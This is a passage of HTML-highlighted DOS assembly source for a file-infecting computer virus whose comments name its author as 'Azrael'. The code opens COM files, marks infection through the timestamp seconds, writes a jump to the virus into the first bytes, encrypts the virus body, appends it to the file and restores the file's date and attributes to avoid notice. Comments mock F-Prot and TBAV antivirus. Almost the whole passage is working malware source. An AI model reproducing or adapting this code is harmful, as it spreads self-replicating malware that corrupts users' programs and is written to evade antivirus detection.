</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">;restore the registers</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">popa</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">popf</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0">                      </span><span class="sc1">;put the registers</span><span class="sc0">
</span><span class="sc6">pusha</span><span class="sc0">                      </span><span class="sc1">;     </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                    </span><span class="sc1">;HEY! AZRAEL IS CRAZY?</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                    </span><span class="sc1">;PUSH, POP, PUSH, POP</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                    </span><span class="sc1">;PLEEEEEAAAAAASEEEEEEEEE</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                    </span><span class="sc1">;PURIFY THIS SHIT!</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                 </span><span class="sc1">;       </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;get the file     </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">attrib</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">  </span><span class="sc1">;atributes   </span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                 </span><span class="sc1">;le saco los atributos al        </span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;file </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------  </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                 </span><span class="sc1">;open the file </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                      </span><span class="sc1">;for read/write</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">;bx=handle</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">;     </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;get the file date  </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">hora</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">   </span><span class="sc1">;put the hour    </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dia</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">;put the day    </span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fecha</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;calculate the seconds    </span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fecha</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;is ecual to 58? (DEDICATE TO N-POX)    </span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">seguir</span><span class="sc0">                  </span><span class="sc1">;yes! the file is infected!     </span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cerrar</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">seguir</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;     </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                </span><span class="sc1">;move the pointer to end</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">movedor</span><span class="sc0">                </span><span class="sc1">;of the file</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                     </span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">;calculate the </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">largo</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;jmp long</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04200h</span><span class="sc0">               </span><span class="sc1">;move the pointer to  </span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">movedor</span><span class="sc0">                </span><span class="sc1">;start of file</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                          </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                     </span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;read the 3 first bytes  </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">;                           </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">real</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;put the bytes in cs:[real]</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                          </span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">real</span><span class="sc4">],</span><span class="sc2">05a4dh</span><span class="sc0">   </span><span class="sc1">;the 2 first bytes = 'MZ' ?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">er1</span><span class="sc0">                         </span><span class="sc1">;yes! is a EXE... fuckkk!</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cerrar</span><span class="sc0">
</span><span class="sc5">er1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                          </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">      </span><span class="sc1">;move the pointer                               </span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">movedor</span><span class="sc0">      </span><span class="sc1">;to start fo file</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                          </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">           </span><span class="sc1">;       </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">            </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">        </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;write the JMP</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">jump</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;instruccion in the</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">           </span><span class="sc1">;fist byte of the file</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                          </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">         </span><span class="sc1">;write the value of jmp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;in the file </span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">largo</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                          </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04202h</span><span class="sc0">      </span><span class="sc1">;move the pointer to </span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">movedor</span><span class="sc0">       </span><span class="sc1">;end of file</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                          </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                     </span><span class="sc1">;        </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;move the code  </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                     </span><span class="sc1">;of my virus      </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">;to cs:end+50     </span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">                         </span><span class="sc1">;for encrypt          </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                 </span><span class="sc1">;    </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0">      </span><span class="sc1">;      </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">    </span><span class="sc1">;        </span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;      </span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                          </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0">           
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crypt2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;virus         </span><span class="sc0">
</span><span class="sc5">enc</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;           </span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;encrypt the virus              </span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                            </span><span class="sc1">;code                   </span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">enc</span><span class="sc0">                          </span><span class="sc1">;              </span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0">           
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;virus         </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">enc2</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;           </span><span class="sc0">

ÿ</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">058h</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">08522h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0e8h</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">012h</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">034h</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">022h</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">035h</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0d5h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">07dh</span><span class="sc0">
ÿ</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                             </span><span class="sc1">;the virus code                  </span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">enc2</span><span class="sc0">                          </span><span class="sc1">;              </span><span class="sc0">
</span><span class="sc1">;--------------------------------------------</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                       </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc1">;copy the virus              </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fin</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0">           </span><span class="sc1">;to end of file</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                          </span><span class="sc0">
</span><span class="sc5">cerrar</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
                                 </span><span class="sc1">;restore the       </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                     </span><span class="sc1">;date and time    </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">hora</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;file   </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dia</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;     </span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fecha</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;and mark the seconds  </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                          </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                       </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                          </span><span class="sc1">;close the file</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                          </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                           </span><span class="sc1">;restore the </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                           </span><span class="sc1">;registers</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                           </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">popa</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">popf</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                          </span><span class="sc0">
</span><span class="sc6">pusha</span><span class="sc0">                           </span><span class="sc1">;   </span><span class="sc0">
                                </span><span class="sc1">;                                                             </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                    </span><span class="sc1">;restores the atributes </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">attrib</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;of the file  </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;   </span><span class="sc0">
                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">popa</span><span class="sc0">                            </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                          </span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">;                           </span><span class="sc0">
</span><span class="sc6">pusha</span><span class="sc0">                           </span><span class="sc1">; 8-(  = f-prot                       </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                         </span><span class="sc1">;                       </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                         </span><span class="sc1">; 8-(  = tbav   </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                         </span><span class="sc1">;                       </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">; 8-)  = I'm                        </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">;                              </span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                          </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524H</span><span class="sc0">                    </span><span class="sc1">;                         </span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">error</span><span class="sc0">                    </span><span class="sc1">;restore the                         </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                       </span><span class="sc1">;errors handler      </span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">error</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">                  </span><span class="sc1">;                         </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;                       </span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                          </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                          </span><span class="sc1">;restore the </span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">;resgisters</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">popa</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">popf</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                          </span><span class="sc0">
</span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">A3</span><span class="sc0">                          </span><span class="sc1">;jmp to orig. INT 21</span><span class="sc0">
                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;**********************************************************</span><span class="sc0">
</span><span class="sc1">;           SUBRUTINES AREA</span><span class="sc0">
</span><span class="sc1">;**********************************************************</span><span class="sc0">
                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">movedor</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;   </span><span class="sc0">
                                </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">;use to move file pointer         </span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">;       </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;        </span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;        </span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------                                          </span><span class="sc0">
